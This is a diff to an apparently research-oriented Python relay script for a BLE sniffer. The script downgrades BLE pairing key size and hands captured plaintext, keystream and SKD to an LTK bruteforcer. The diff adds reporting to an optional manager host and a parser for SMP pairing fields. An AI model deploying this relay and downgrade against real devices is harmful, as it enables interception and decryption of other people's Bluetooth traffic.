@@ -30,8 +30,12 @@ from mitble_help import downgrade_pairing_request, downgrade_pairing_response, \
 
 from pathlib import Path
 from datetime import datetime
+from manager_client import ManagerClient
+
 import os
 import subprocess
+import json
+import socket
 """
 Relay attack principles:
 
@@ -132,6 +136,8 @@ EXPERIMENTS_DIR.mkdir(parents=True, exist_ok=True)
 
 LTK_BIN_PATH = EXPERIMENTS_DIR/"LTK-relay"/"ltk_found.bin"
 
+#mgr_sock = socket.create_connection(("127.0.0.1", 9000))
+
 def sigint_handler(sig, frame):
     hw.cancel_recv()
     hw.cmd_chan_aa_phy() # stop scanning or connection
@@ -141,6 +147,7 @@ def sigint_handler(sig, frame):
 def main():
     global uart_test_pending, uart_last_seq
     global ltk
+    global hw, periph_ser, new_key_size
 
     aparse = argparse.ArgumentParser(description="Relay master script for Sniffle BLE5 sniffer")
     aparse.add_argument("-s", "--serport", default=None, help="Sniffer serial port name")
@@ -167,11 +174,17 @@ def main():
         help="Serial port of the REAL peripheral (e.g. COM7 or /dev/ttyACM0)")
     aparse.add_argument("--periph-baud", type=int, default=115200,
         help="Baudrate for the REAL peripheral (default: 115200)")
+    aparse.add_argument("--manager-host", default=None,
+                        help="Manager host for reporting (optional)")
+    aparse.add_argument("--manager-port", type=int, default=9000,
+                        help="Manager port (default 9000)")
     args = aparse.parse_args()
-    global hw, periph_ser, new_key_size
     hw = SniffleHW(args.serport)
     
-
+    mgr = None
+    if args.manager_host is not None:
+        mgr = ManagerClient(args.manager_host, args.manager_port)
+        mgr.connect()
 
     # put the hardware in a normal state (passive scanning) and configure it with an impossibly
     # high RSSI threshold so that it captures nothing (to avoid filling receive buffers)
@@ -367,7 +380,7 @@ def main():
             sock_recv_print_forward(conn, args.quiet, filter_changes)
 
         if hw.ser.fd in ready:
-            ser_recv_print_forward(conn, args.quiet, filter_changes)
+            ser_recv_print_forward(conn, args.quiet, filter_changes, mgr)
 
         if periph_ser is not None:
             try:
@@ -462,7 +475,8 @@ def write_attack_data_binary(exp_dir: Path,
                              key_size: int,
                              plaintext: bytes,
                              ciphertext: bytes,
-                             skd: bytes) -> Path:
+                             skd: bytes,
+                             manager=None) -> Path:
     if not (1 <= key_size <= 16):
         raise ValueError(f"key_size must be 1..16, got {key_size}")
     if len(plaintext) != 16 or len(ciphertext) != 16 or len(skd) != 16:
@@ -479,6 +493,13 @@ def write_attack_data_binary(exp_dir: Path,
     print(f"[BRUTEFORCER] Run your C++ tool like:")
     print(f"    cd {BRUTEFORCER_DIR}")
     print(f"    ./bruteforcer_ltk {attack_path.name}")
+    if manager is not None:
+        manager.report_attack_data_ready(
+            exp_dir=str(exp_dir),
+            attack_path=str(attack_path),
+            key_size_bytes=key_size,
+        )
+
     return attack_path
 
 def _hex_bytes(b: bytes) -> str:
@@ -510,6 +531,40 @@ def _extract_smp_key_size_from_ll_body(ll_body: bytes):
         return (None, None)
     return (smp_code, smp[4])
 
+def _extract_smp_auth_from_ll_body(ll_body: bytes):
+    # very similar to _extract_smp_key_size_from_ll_body
+    if len(ll_body) < 4:
+        return None
+    llid = ll_body[0] & 0x03
+    length = ll_body[1]
+    if llid != 0x02 or len(ll_body) < 2 + length or length < 7:
+        return None
+    l2cap = ll_body[2:2+length]
+    if len(l2cap) < 11:
+        return None
+    l2len = l2cap[0] | (l2cap[1] << 8)
+    cid   = l2cap[2] | (l2cap[3] << 8)
+    if cid != 0x0006 or len(l2cap) < 4 + l2len or l2len < 11:
+        return None
+    smp = l2cap[4:4+l2len]
+    code = smp[0]
+    if code not in (0x01, 0x02):  # Pairing Req/Resp
+        return None
+    # SMP Pairing Request/Response fields:
+    # [0] code
+    # [1] IOcap
+    # [2] OOB
+    # [3] authReq
+    # [4] maxKeySize
+    # [5] initKeyDist
+    # [6] respKeyDist
+    auth_req = smp[3]
+    key_size = smp[4]
+    sc = bool(auth_req & 0x08)
+    mitm = bool(auth_req & 0x04)
+    bonding = bool(auth_req & 0x03)
+    return (key_size, auth_req, sc, mitm, bonding)
+
 
 def _extract_skd_iv_from_ll_enc_req(ctrl: LlControlMessage):
     body = ctrl.body
@@ -536,7 +591,7 @@ def decrypt_pdu(session_key: bytes, iv: bytes, packet_counter: int, direction_bi
     return ble_ccm_decrypt(session_key, iv, packet_counter, direction_bit, pdu)
 
 
-def ser_recv_print_forward(conn, quiet, filter_changes=False):
+def ser_recv_print_forward(conn, quiet, filter_changes=False, manager=None):
     global enc_start_seen, first_enc_rsp_pkt
     global ivm_from_c, ivs_from_p, iv_real_cp
     global uart_test_pending, uart_last_seq
@@ -730,13 +785,7 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False):
                        
                         key_size = new_key_size
                         exp_dir = create_experiment_dir()
-                        write_attack_data_binary(
-                            exp_dir,
-                            key_size,
-                            a0,            
-                            keystream,     
-                            skd_for_aes,   
-                        )
+                        write_attack_data_binary(exp_dir, key_size, a0, keystream, skd_for_aes, manager)
 
 
 
@@ -778,6 +827,17 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False):
                 print(f"  old LL body ({len(old_body)} bytes): {_hex_bytes(old_body)}")
                 print(f"  new LL body ({len(new_ll)} bytes): {_hex_bytes(new_ll)}")
                 msg.body = new_ll
+            if manager is not None:
+                parsed = _extract_smp_auth_from_ll_body(new_ll)
+                if parsed is not None:
+                    key_size, auth_req, sc, mitm, bonding = parsed
+                    manager.report_pairing_params(
+                        key_size_bytes=key_size,
+                        auth_req=auth_req,
+                        sc=sc,
+                        mitm=mitm,
+                        bonding=bonding,
+                    )
 
         if not empty and not block_req:
             # Forward packets to the relay slave
